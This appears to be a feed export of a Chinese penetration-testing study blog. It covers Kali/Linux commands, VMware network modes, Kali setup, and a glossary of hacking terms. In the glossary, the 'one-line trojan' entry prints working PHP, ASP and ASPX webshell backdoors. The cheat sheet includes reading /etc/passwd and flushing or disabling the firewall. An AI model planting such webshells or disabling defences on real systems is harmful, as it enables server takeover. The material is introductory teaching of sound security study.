href="#压缩和解压" class="headerlink" title="压缩和解压"></a>压缩和解压</h4><p>bzip2 file1 压缩一个叫做 ‘file1’ 的文件</p><p>gunzip file1.gz 解压一个叫做 ‘file1.gz’的文件</p><p>gzip file1 压缩一个叫做 ‘file1’的文件</p><p>gzip -9 file1 最大程度压缩</p><p>rar a file1.rar test_file 创建一个叫做 ‘file1.rar’ 的包</p><p>rar x file1.rar 解压rar包</p><p>unrar x file1.rar 解压rar包</p><p>DEB 包 (Debian, Ubuntu 以及类似系统)<br>dpkg -i package.deb 安装/更新一个 deb 包</p><p>dpkg -r package_name 从系统删除一个 deb 包</p><p>dpkg -l 显示系统中所有已经安装的 deb 包</p><p>dpkg -l | grep httpd 显示所有名称中包含 “httpd” 字样的deb包</p><p>dpkg -s package_name 获得已经安装在系统中一个特殊包的信息</p><p>dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表</p><p>dpkg –contents package.deb 显示尚未安装的一个包所提供的文件列表</p><p>tar zcvf +压缩文件名 压缩文件</p><p>tar zxvf +解压包名 解压文件</p><p>tar -jcvf renwolesshel.tar.bz2 打包</p><p>tar jxvf renwolesshel.tar.bz2 解压</p><h4 id="压缩成zip格式"><a href="#压缩成zip格式" class="headerlink" title="压缩成zip格式"></a>压缩成zip格式</h4><p>zip -q -r renwolesshel.zip renwolesshel/<br>解压zip格式的压缩包</p><p>unzip renwolesshel.zip</p><p>which 加软件名 可以查出软件目录在哪</p><p>./+文件名或者apt-get +文件名 安装文件</p><h3 id="3-系统信息"><a href="#3-系统信息" class="headerlink" title="3.系统信息"></a>3.系统信息</h3><p>arch 显示机器的处理器架构(1)</p><p>uname -m 显示机器的处理器架构(2)</p><p>uname -r 显示正在使用的内核版本</p><p>cat /proc/version 显示内核的版本</p><p>cat /proc/net/dev 显示网络适配器及统计</p><p>cat /proc/cpuinfo 显示CPU info的信息</p><p>cat /proc/mounts 显示已加载的文件系统</p><h3 id="4-vi-常用命令"><a href="#4-vi-常用命令" class="headerlink" title="4.vi 常用命令"></a>4.vi 常用命令</h3><h4 id="vi编辑器的概念"><a href="#vi编辑器的概念" class="headerlink" title="vi编辑器的概念"></a>vi编辑器的概念</h4><p>vi编辑器分为三种状态，分别是：<br>1.命令模式（command mode）<br>控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。</p><p>2.插入模式（Insert mode）</p><p>只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。</p><p>3.底行模式（last line mode）</p><p>将文件保存或退出vi，也可以设置编辑环境，如寻找字符串、列出行号……等。</p><h4 id="打开"><a href="#打开" class="headerlink" title="打开"></a><strong>打开</strong></h4><p>vi filename :打开或新建文件，并将光标置于第一行首<br>vi +n filename ：打开文件，并将光标置于第n行首<br>vi + filename ：打开文件，并将光标置于最后一行首</p><h4 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a><strong>编辑</strong></h4><p>i 在当前位置生前插入<br>I 在当前行首插入<br>a 在当前位置后插入<br>A 在当前行尾插入<br>o 在当前行之后插入一行<br>O 在当前行之前插入一行<br>编辑结束，按Esc返回命令模式</p><h4 id="基本查找"><a href="#基本查找" class="headerlink" title="基本查找"></a><strong>基本查找</strong></h4><p>/text　　查找text，按n健查找下一个，按N健查找前一个。<br>?text　　查找text，反向查找，按n健查找下一个，按N健查找前一个。<br>查找很长的词，如果一个词很长，键入麻烦，可以将光标移动到该词上，按*或#键即可以该单词进行搜索，相当于/搜索。而#命令相当于?搜索。</p><h4 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a><strong>删除</strong></h4><p>删除当前行 dd<br>删除2行 2dd</p><h4 id="拷贝和粘贴"><a href="#拷贝和粘贴" class="headerlink" title="拷贝和粘贴"></a><strong>拷贝和粘贴</strong></h4><p>yy 拷贝当前行<br>nyy 拷贝当前后开始的n行，比如2yy拷贝当前行及其下一行。<br>p  在当前光标后粘贴</p><p>区块拷贝</p><ol><li>将光标移动到要复制的文本开始的地方，按 v进入可视模式。</li><li>将光标移动到要复制的文本的结束的地方，按y复制。此时vim会自动将光标定位到选中文本的开始的地方，并退出可视模式。</li><li>我移动光标到文本结束的地方，按 p粘贴。</li></ol><h4 id="退出命令"><a href="#退出命令" class="headerlink" title="退出命令"></a><strong>退出命令</strong></h4><p>:wq 保存并退出<br>:q! 强制退出并忽略所有更改<br>:e! 放弃所有修改，并打开原来文件<br>:w保存修改</p><h4 id="显示行号"><a href="#显示行号" class="headerlink" title="显示行号"></a><strong>显示行号</strong></h4><p>set number</p><p>set nu</p><p>输入:n，代表跳转到第n行，如:100，就跳转到第100行。</p><h4 id="撤销操作"><a href="#撤销操作" class="headerlink" title="撤销操作"></a>撤销操作</h4><p>u</p><p>vim与vi的区别</p><p>vim是vi的延申 vim编辑源码会高亮 vim的命令对vi是完全兼容的</p><h3 id="5-文件搜索"><a href="#5-文件搜索" class="headerlink" title="5.文件搜索"></a>5.文件搜索</h3><p>find / -name file1 从 ‘/’ 开始进入根文件系统搜索文件和目录</p><p>find / -user user1 搜索属于用户 ‘user1’ 的文件和目录<br>find /home/user1 -name *.bin 在目录 ‘/ home/user1’ 中搜索带有’.bin’ 结尾的文件<br>find /usr/bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件<br>find /usr/bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件</p><p>find . -name ‘<em>.php’ -mmin -30  查找最近30分钟修改的当前目录下的.php文件<br>find . -name ‘</em>.php’ -mtime 0<br>查找最近24小时修改的当前目录下的.php文件</p><p>find . -name ‘*.inc’ -mtime 0 -ls<br>查找最近24小时修改的当前目录下的.php文件，并列出详细信息</p><p>find . -type f -mtime 1</p><p>查找当前目录下，最近24-48小时修改过的常规文件。<br>find . -type f -mtime +1<br>查找当前目录下，最近1天前修改过的常规文件。</p><p>-atime 文件访问时间</p><p>-ctime 文件常见时间</p><p>-mtime文件修改时间</p><p>-mtime n : n为数字，意思为在n天之前的“一天之内”被更改过内容的文件<br>-mtime +n : 列出在n天之前（不含n天本身）被更改过内容的文件名<br>-mtime -n : 列出在n天之内（含n天本身）被更改过内容的文件名</p><p>-type f 代表一个普通格式的文件 二进制文件</p><p>-type d 代表文件夹</p><p>find / -name *.rpm -exec chmod 755 ‘{}’ ; 搜索以 ‘.rpm’ 结尾的文件并定义其权限<br>find / -xdev -name *.rpm 搜索以 ‘.rpm’ 结尾的文件，忽略光驱、捷盘等可移动设备<br>locate *.ps 寻找以 ‘.ps’ 结尾的文件 - 先运行 ‘updatedb’ 命令<br>whereis halt 显示一个二进制文件、源码或man的位置<br>which halt 显示一个二进制文件或可执行文件的完整路径</p><p>grep kali /etc/passwd grep关键词搜索</p><p>find / -name moonsec 2&gt;/dev/null   搜索某个文件/文件夹 屏蔽出错信息</p><h3 id="6-用户和群组"><a href="#6-用户和群组" class="headerlink" title="6.用户和群组"></a>6.用户和群组</h3><h4 id="日常-1"><a href="#日常-1" class="headerlink" title="日常"></a>日常</h4><p>groupadd group_name 创建一个新用户组<br>groupdel group_name 删除一个用户组</p><p>cat /etc/group | grep group_name </p><p>usermod -a -G moontea k1把用户k1附加其他用户组</p><h4 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h4><p>useradd moonsec</p><p>passwd moonsec</p><h4 id="创建用户以及分配目录"><a href="#创建用户以及分配目录" class="headerlink" title="创建用户以及分配目录"></a>创建用户以及分配目录</h4><p>useradd -r -m -s /bin/bash moonsec</p><p>参数的意思：<br>-r 建立系统账号<br>-m 自动建立用户的登入目录<br>-s /bin/bash 指定用户登入后所使用的shell</p><h4 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h4><p>su - root 切换到root用户</p><p>su 用户名 切换到普通用户</p><h3 id="7-系统管理"><a href="#7-系统管理" class="headerlink" title="7.系统管理"></a>7.系统管理</h3><p>top</p><p>查看正在指向的程序信息</p><p>进程</p><p>ps -ef 查看所有进程信息</p><p>ps -ef | grep tomcat 查找指定进程</p><p>kill -9 id 强制杀死进程</p><p>env 当前的变量</p><p>查看系统变量</p><p>echo $PATH</p><p>hostname 查看主机名</p><p>history 查看历史命令</p><h3 id="8-查看磁盘信息"><a href="#8-查看磁盘信息" class="headerlink" title="8.查看磁盘信息"></a>8.查看磁盘信息</h3><p>df   默认不带单位，挂载点、总容量、已用、可用</p><p>df  -h   友好显示（带单位），很多命令的友好显示都是-h</p><h3 id="9-查看内存信息"><a href="#9-查看内存信息" class="headerlink" title="9.查看内存信息"></a>9.查看内存信息</h3><p>free   默认以KB为单位，总容量、已用、可用、缓存大小</p><p>free  -m   默认以MB为单位</p><p>free  -h   上面2种都不带单位、只显示数值，这种是友好显示的，会带单位G、M等</p><h3 id="10-查看环境变量"><a href="#10-查看环境变量" class="headerlink" title="10.查看环境变量"></a>10.查看环境变量</h3><p>echo  $JAVA_HOME<br>echo $PATH | grep jdk</p><h3 id="11开机自启"><a href="#11开机自启" class="headerlink" title="11开机自启"></a>11开机自启</h3><p>有很多程序往往都需要设置开机自启，比如tomcat、mysql、nginx等。</p><p>在/etc/rc.d/rc.local文件中加入开机要自动执行的程序</p><p>vim /etc/rc.d/rc.local</p><p>挂载一个windows网络共享</p><p>mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share </p><h3 id="12网卡配置"><a href="#12网卡配置" class="headerlink" title="12网卡配置"></a>12网卡配置</h3><p>vi /etc/network/interfaces</p><p>auto eth0  //指定网卡（根据ifconfig结果修改）<br>iface eth0 inet static  //启动静态ip<br>address 192.168.0.66  // 设置静态ip<br>netmask 255.255.255.0  //子网掩码<br>gateway 192.168.0.1  //指定网关</p><p>重启网络</p><p>service networking restart<br>或者：<br>systemctl restart networking</p><p>设置临时ip</p><p>ifconfig eth0 192.168.0.33</p><h3 id="13网卡DNS服务器"><a href="#13网卡DNS服务器" class="headerlink" title="13网卡DNS服务器"></a>13网卡DNS服务器</h3><p>vi /etc/resolv.conf</p><p>nameserver 114.114.114.114</p><p>重启网卡</p><p>service networking restart</p><p>systemctl restart networking</p><p>注意有时候重启才生效</p><h3 id="14-服务相关"><a href="#14-服务相关" class="headerlink" title="14.服务相关"></a>14.服务相关</h3><p>启动apache2服务器</p><p> /etc/init.d/apache2 start</p><p>打开：/etc/init.d/apache2 start<br>重启：/etc/init.d/apache2 restart<br>关闭：/etc/init.d/apache2 stop</p><p>启动网卡</p><p>/etc/init.d/network start</p><p>网络相关</p><p>开启路由转发</p><p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p><h3 id="15-linux常用网络命令"><a href="#15-linux常用网络命令" class="headerlink" title="15.linux常用网络命令"></a><strong>15.linux常用网络命令</strong></h3><p>网络和监控命令类似于这些： hostname, ping, ifconfig, iwconfig, netstat, nslookup, traceroute, finger, telnet, ethtool 用于查看 linux 服务器 ip 地址，管理服务器网络配置，通过 telnet 和 ethernet 建立与 linux 之间的网络链接，查看 linux 的服务器信息等。下面让我们看看在 Linux 下的网络和监控命令的使用。</p><p>hostname 查看本机名</p><p>ping  一般用于测试网络是否通 内网icmp</p><p>ping <a href="http://www.baidu.com/">www.baidu.com</a> -c 3 执行3次</p><p>ifconfig 网卡信息</p><p>iwconfig 用于配置或获取无线网络设备信息</p><p>netstat </p><p>-a (all)显示所有选项，默认不显示LISTEN相关<br>-t (tcp)仅显示tcp相关选项<br>-u (udp)仅显示udp相关选项<br>-n 拒绝显示别名，能显示数字的全部转化成数字。<br>-l 仅列出有在 Listen (监听) 的服務状态</p><p>-p 显示建立相关链接的程序名<br>-r 显示路由信息，路由表<br>-e 显示扩展信息，例如uid等<br>-s 按各个协议进行统计<br>-c 每隔一个固定时间，执行该netstat命令。</p><p>提示：LISTEN和LISTENING的状态只有用-a或者-l才能看到</p><p>常用命令</p><p>netstat -ano</p><p>-an 查看当前所有已连接端口<br>-nlpt 查看当前所有tcp端口<br>-nlpu 查看当前所有udp端口<br>-nlpt | grep 80 查看所有80端口使用情况</p><p>netstat -lntup 查看所有的tcp和upd端口</p><p>nslookup </p><p>查询其他记录<br>直接查询返回的是A记录，我们可以指定参数，查询其他记录，比如AAAA、MX等。</p><p>nslookup -qt=type domain [dns-server]<br>其中，type可以是以下这些类型：</p><p>A 地址记录<br>AAAA 地址记录<br>AFSDB Andrew文件系统数据库服务器记录<br>ATMA ATM地址记录<br>CNAME 别名记录<br>HINFO 硬件配置记录，包括CPU、操作系统信息<br>ISDN 域名对应的ISDN号码<br>MB 存放指定邮箱的服务器<br>MG 邮件组记录<br>MINFO 邮件组和邮箱的信息记录<br>MR 改名的邮箱记录<br>MX 邮件服务器记录<br>NS 名字服务器记录<br>PTR 反向记录<br>RP 负责人记录<br>RT 路由穿透记录<br>SRV TCP服务器信息记录<br>TXT 域名对应的文本信息<br>X25 域名对应的X.25地址记录</p><p>http协议</p><p>curl</p><p>wget</p><p>traceroute</p><p>traceroute是用来检测发出数据包的主机到目标主机之间所经过的网关数量的工具。traceroute的原理是试图以最小的TTL（存活时间）发出探测包来跟踪数据包到达目标主机所经过的网关，然后监听一个来自网关ICMP的应答。发送数据包的大小默认为38个字节。</p><p>-d 使用Socket层级的排错功能。<br>-f 设置第一个检测数据包的存活数值TTL的大小。<br>-F 设置勿离断位。<br>-g 设置来源路由网关，最多可设置8个。<br>-i 使用指定的网络界面送出数据包。<br>-I 使用ICMP回应取代UDP资料信息。<br>-m 设置检测数据包的最大存活数值TTL的大小。<br>-n 直接使用IP地址而非主机名称。<br>-p 设置UDP传输协议的通信端口。<br>-r 忽略普通的Routing Table，直接将数据包送到远端主机上。<br>-s 设置本地主机送出数据包的IP地址。<br>-t 设置检测数据包的TOS数值。<br>-v 详细显示指令的执行过程。<br>-w 设置等待远端主机回报的时间。</p><p>-x 开启或关闭数据包的正确性检验。</p><p>telnet</p><p>Linux telnet命令用于远端登入。</p><p>执行telnet指令开启终端机阶段作业，并登入远端主机。</p><p>现在多数用于检测某个端口是否开放</p><p>Finger</p><p>Finger是一种用户信息分享服务。它工作在TCP 79端口，可以用来公开用户的特定信息。Nmap的finger的脚本可以向Finger服务器发送请求，查询并获取用户的相关信息，如登录名、用户名、TTY类型、登录时间等。</p><p>ethtool 是用于查询及设置网卡参数的命令</p><h3 id="16-防火墙iptables"><a href="#16-防火墙iptables" class="headerlink" title="16.防火墙iptables"></a>16.防火墙iptables</h3><p>查看防火墙规则</p><p>iptalbes -L</p><p>清除规则</p><p>iptables -F</p><p>关闭防火墙 </p><p>/etc/init.d/iptables stop</p><p>service iptables stop</p><p>安装：apt-get install ufw</p><p>关闭：ufw disable # To disable the firewall</p><p>开启：ufw enable # To enable the firewall</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali基础命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透基础</title>
      <link href="/2021/07/16/60-zhi-day12-1/"/>
      <url>/2021/07/16/60-zhi-day12-1/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试基础知识"><a href="#渗透测试基础知识" class="headerlink" title="渗透测试基础知识"></a>渗透测试基础知识</h1><span id="more"></span><h2 id="01VMware虚拟机的学习和使用"><a href="#01VMware虚拟机的学习和使用" class="headerlink" title="01VMware虚拟机的学习和使用"></a>01VMware虚拟机的学习和使用</h2><h3 id="VMware的几个虚拟设备"><a href="#VMware的几个虚拟设备" class="headerlink" title="VMware的几个虚拟设备"></a>VMware的几个虚拟设备</h3><ul><li>VMnet0：用于虚拟桥接网络下的虚拟交换机</li><li>VMnet1：用于虚拟Host-Only网络下的虚拟交换机</li><li>VMnet8：用于虚拟NAT网络下的虚拟交换机</li><li>VMware Network Adepter VMnet1：Host用于与Host-Only虚拟网络进行通信的虚拟网卡</li><li>VMware Network Adepter VMnet8：Host用于与NAT虚拟网络进行通信的虚拟网卡</li><li>安装了VMware虚拟机后，会在网络连接对话框中多出两个虚拟网卡</li></ul><h3 id="网络模式"><a href="#网络模式" class="headerlink" title="网络模式"></a>网络模式</h3><h4 id="桥接网络"><a href="#桥接网络" class="headerlink" title="桥接网络"></a>桥接网络</h4><p>桥接网络是指本地物理网卡和虚拟网卡通过VMnet0虚拟交换机进行桥接，物理网卡和虚拟网卡在拓扑图上处于同等地位（虚拟网卡既不是Adepter VMnet1也不是Adepter VMnet8）。</p><p>那么物理网卡和虚拟网卡就相当于处于同一个网段，虚拟交换机就相当于一台现实网络中的交换机。所以两个网卡的IP地址也要设置为同一网段。</p><h3 id="NAT模式"><a href="#NAT模式" class="headerlink" title="NAT模式"></a>NAT模式</h3><p>在NAT网络中，会用到VMware Network Adepter VMnet8虚拟网卡，主机上的VMware Network Adepter VMnet8虚拟网卡被直接连接到VMnet8虚拟交换机上与虚拟网卡进行通信。</p><p>VMware Network Adepter VMnet8虚拟网卡的作用仅限于和VMnet8网段进行通信，它不给VMnet8网段提供路由功能，所以虚拟机虚拟一个NAT服务器，使虚拟网卡可以连 接到Internet。在这种情况下，我们就可以使用端口映射功能，让访问主机80端口的请求映射到虚拟机的80端口上。</p><p>VMware Network Adepter VMnet8虚拟网卡的IP地址是在安装VMware时由系统指定生成的，我们不要修改这个数值，否则会使主机和虚拟机无法通信。</p><p>虚拟出来的网段和NAT模式虚拟网卡的网段是一样的，都为192.168.111.X，包括NAT服务器的IP地址也是这个网段。在安装VMware之后同样会生成一个虚拟DHCP服务器，为NAT服务器分配IP地址。<br>当主机和虚拟机进行通信的时候就会调用VMware Network Adepter VMnet8虚拟网卡，因为他们都在一个网段，所以通信就不成问题了。</p><p>实际上，VMware Network Adepter VMnet8虚拟网卡的作用就是为主机和虚拟机的通信提供一个接口，即使主机的物理网卡被关闭，虚拟机仍然可以连接到Internet，但是主机和虚拟机之间就不能互访了。</p><h3 id="Host-only模式"><a href="#Host-only模式" class="headerlink" title="Host-only模式"></a>Host-only模式</h3><p>在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。其实Host-Only网络和NAT网络很相似，不同的 地方就是Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet。主机和虚拟机之间的通信是通过VMware Network Adepter VMnet1虚拟网卡来实现的。</p><p>同NAT一样，VMware Network Adepter VMnet1虚拟网卡的IP地址也是VMware系统指定的，同时生成的虚拟DHCP服务器和虚拟网卡的IP地址位于同一网段，但和物理网卡的IP地址不在同一网段。</p><p>Host-Only的宗旨就是建立一个与外界隔绝的内部网络，来提高内网的安全性。这个功能或许对普通用户来说没有多大意义，但大型服务商会常 常利用这个功能。如果你想为VMnet1网段提供路由功能，那就需要使用RRAS，而不能使用XP或2000的ICS，因为ICS会把内网的IP地址改为 192.168.0.1，但虚拟机是不会给VMnet1虚拟网卡分配这个地址的，那么主机和虚拟机之间就不能通信了。</p><h3 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h3><p>在VMware的3中网络模式中，NAT模式是最简单的，基本不需要手动配置IP地址等相关参数。至于桥接模式则需要额外的IP地址，如果是在内网环境中还很容易，如果是ADSL宽带就比较麻烦了，ISP一般是不会大方的多提供一个公网IP的。 </p><p><img src="/2021/07/16/60-zhi-day12-1/image-20210716175659319.png" alt="image-20210716175659319"></p><h2 id="02kali的安装和配置"><a href="#02kali的安装和配置" class="headerlink" title="02kali的安装和配置"></a>02kali的安装和配置</h2><h3 id="安装虚拟机open-vm-tools-desktop模块"><a href="#安装虚拟机open-vm-tools-desktop模块" class="headerlink" title="安装虚拟机open-vm-tools-desktop模块"></a>安装虚拟机open-vm-tools-desktop模块</h3><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install open-vm-tools-desktop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置中文</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqysudo dpkg-reconfigure locales选择字符 zh_CN.UTF-8重启 reboot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>安装python3的pip</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install python3-pipmkdir -p ~/.pipvim ~/.pip/pip.conf然后将下列的内容写入~/.pip/pip.conf即可。[global]index-url = http://pypi.douban.com/simple[install]trusted-host=pypi.douban.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更新源</p><pre class="line-numbers language-none"><code class="language-none">sudo cp /etc/apt/sources.list /etc/apt/sources.list.baksudo vim /etc/apt/sources.list下面选一个#阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#清华大学deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙大deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freeapt-get update 更新系统apt-get upgrade 升级已安装的所有软件包apt-get dist-upgrade 升级软件 会自动处理依赖包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>做完这些之后我们拍个快照</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VMware虚拟机学习和使用 </tag>
            
            <tag> kali安装和配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透术语</title>
      <link href="/2021/07/15/60-zhi-day11-1/"/>
      <url>/2021/07/15/60-zhi-day11-1/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试基础知识"><a href="#渗透测试基础知识" class="headerlink" title="渗透测试基础知识"></a>渗透测试基础知识</h1><span id="more"></span><h2 id="渗透测试扫盲篇"><a href="#渗透测试扫盲篇" class="headerlink" title="渗透测试扫盲篇"></a>渗透测试扫盲篇</h2><h3 id="肉鸡"><a href="#肉鸡" class="headerlink" title="肉鸡"></a>肉鸡</h3><blockquote><p>所谓“肉鸡”是一种很形象的比喻，比喻那些可以随意被我们控制的电脑，对方可以是WINDOWS系统，也可以是UNIX/LINUX系统，可以是普通的个人电脑，也可以是大型的服务器，我们可以像操作自己的电脑那样来操作它们，而不被对方所发觉。</p></blockquote><h3 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h3><blockquote><p>就是那些表面上伪装成了正常的程序，但是当这些被程序运行时，就会获取系统的整个控制权限。有很多黑客就是热衷于使用木马程序来控制别人的电脑，比如灰鸽子，黑洞，PcShare等等。</p></blockquote><h3 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h3><blockquote><p>远程控制，是在网络上由一台电脑（主控端Remote/客户端）远距离去控制另一台电脑（被控端Host/服务器端）的技术，这里的远程不是字面意思的远距离，一般指通过网络控制远端电脑。</p></blockquote><h3 id="网页木马"><a href="#网页木马" class="headerlink" title="网页木马"></a>网页木马</h3><blockquote><p>表面上伪装成普通的网页文件或是将自已的代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或者浏览器的漏洞自动将配置好的木马下载到访问者的电脑上来自动执行。</p></blockquote><h3 id="黑页"><a href="#黑页" class="headerlink" title="黑页"></a>黑页</h3><blockquote><p>一些计算机被入侵后，入侵者为了证明自己的存在，对网站主页（在服务器开放WEB服务的情况下）进行改写，从而公布入侵者留下的信息，这样的网页通常称为黑页。</p></blockquote><p>挂马</p><blockquote><p>就是在别人的网站文件里面放入网页木马或者是将代码潜入到对方正常的网页文件里，以使浏览者中马。</p></blockquote><p>大马</p><blockquote><p>功能强大的网页后门，能执行命令，操作文件，连接数据库</p></blockquote><p><img src="/2021/07/15/60-zhi-day11-1/image-20210716100150378.png" alt="image-20210716100150378"></p><p>小马</p><blockquote><p>比较单一的网页后门。一般是上传保存大马。asp小马asp旁注小马</p></blockquote><p><img src="/2021/07/15/60-zhi-day11-1/image-20210716100158742.png" alt="image-20210716100158742"></p><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><blockquote><p>一段很小的网页代码后门，可以用客户端连接，对网站进行控制。如中国菜刀。服务端是一句话后门。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">php的一句话木马： &lt;?php @eval($_POST['pass']);?&gt;asp的一句话是：   &lt;%eval request ("pass")%&gt;aspx的一句话是：  &lt;%@ Page Language="Jscript"%&gt;&lt;%eval(Request.Item["pass"],"unsafe");%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><blockquote><p>这是一种形象的比喻，攻击者在利用某些方法成功的控制了目标主机后，可以在对方的系统中植入特定的程序，或者是修改某些设置。这些改动表面上是很难被察觉的，但是攻击者却可以使用相应的程序或者方法来轻易的与这台电脑建立连接，重新控制这台电脑。</p><p>就好象是攻击者偷偷的配了一把主人房间的钥匙，可以随时进出而不被主人发现一样。通常大多数的特洛伊木马（TrojanHorse）程序都可以被攻击者用于制作后门（BackDoor）</p></blockquote><h3 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h3><blockquote><p>拖库本来是数据库领域的术语，指从数据库中导出数据。</p><p>现在是指：黑客入侵数据库后把数据库导出来。</p></blockquote><h3 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h3><blockquote><p>社工库是黑客与大数据方式进行结合的一种产物。</p><p>黑客们将泄漏的用户数据整合分析，然后集中归档的一个地方。</p></blockquote><h3 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h3><blockquote><p>撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登陆其他网站后，得到一系列可以登录的用户。很多用户在不同网站使用的是相同的帐号密码，因此黑客可以通过获取用户在A网站的账户从而尝试登录B网址，这就可以理解为撞库攻击。</p></blockquote><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><blockquote><p>提权，顾名思义就是提高自己在服务器中的权限，就比如在windows中你本身登录的用户是guest，然后通过提权后就变成超级管理员，拥有了管理Windows的所有权限。提权是黑客的专业名词，一般用于网站入侵和系统入侵中。</p></blockquote><h3 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h3><blockquote><p>网络钓鱼(Phishing)一词，是“Fishing”和“Phone”的综合体，由于黑客始祖起初是以电话作案，所以用“Ph”来取代“F”，创造了“Phishing”。</p><p>然而，当今的“网络钓鱼”攻击利用欺骗性的电子邮件和伪造的Web站点来进行诈骗活动，受骗者往往会泄露自己的财务数据，如信用卡号、账户用户名、口令和社保编号等内容。</p></blockquote><h3 id="社会工程学攻击"><a href="#社会工程学攻击" class="headerlink" title="社会工程学攻击"></a>社会工程学攻击</h3><blockquote><p>社会工程学攻击是一种通过对被攻击者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱所采取的诸如欺骗、伤害等危害手段，获取自身利益的手法。</p><p>黑客社会工程学攻击则是将黑客入侵攻击手段进行了最大化，不仅能够利用系统的弱点进行入侵，还能通过人性的弱点进行入侵，当黑客攻击与社会工程学攻击融为一体时，将根本不存在所谓安全的系统</p></blockquote><h3 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h3><blockquote><p>rootkit是攻击者用来隐藏自己的行踪和保留root（根权限，可以理解成WINDOWS下的system或者管理员权限）访问权限的工具。</p><p>通常，攻击者通过远程攻击的方式获得root访问权限，或者是先使用密码猜解（破解）的方式获得对系统的普通访问权限，进入系统后，再通过，对方系统内存在的安全漏洞获得系统的root权限。</p><p>然后，攻击者就会在对方的系统中安装rootkit，以达到自己长久控制对方的目的，rootkit与我们前边提到的木马和后门很类似，但远比它们要隐蔽，黑客守卫者就是很典型的rootkit，还有国内的ntroorkit等都是不错的rootkit工具。</p></blockquote><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h3><blockquote><p>是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限.</p><p>在远程管理计算机和查看计算机的共享资源时使用。</p></blockquote><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><blockquote><p>那些强度不够，容易被猜解的，类似123，abc这样的口令（密码）</p></blockquote><h3 id="默认共享"><a href="#默认共享" class="headerlink" title="默认共享"></a>默认共享</h3><blockquote><p>默认共享是WINDOWS2000/XP/2003系统开启共享服务时自动开启所有硬盘的共享，因为加了”$”符号，所以看不到共享的托手图表，也成为隐藏共享。</p></blockquote><h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><blockquote><p>指的是一种命令指行环境，比如我们按下键盘上的“开始键+R”时出现“运行”对话框，在里面输入“cmd”会出现一个用于执行命令的黑窗口，这个就是WINDOWS的Shell执行环境。</p><p>通常我们使用远程溢出程序成功溢出远程电脑后得到的那个用于执行系统命令的环境就是对方的shell。</p></blockquote><h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h3><blockquote><p>交互式模式就是shell等待你的输入，并且执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当你签退后，shell也终止了。</p></blockquote><h3 id="webshell"><a href="#webshell" class="headerlink" 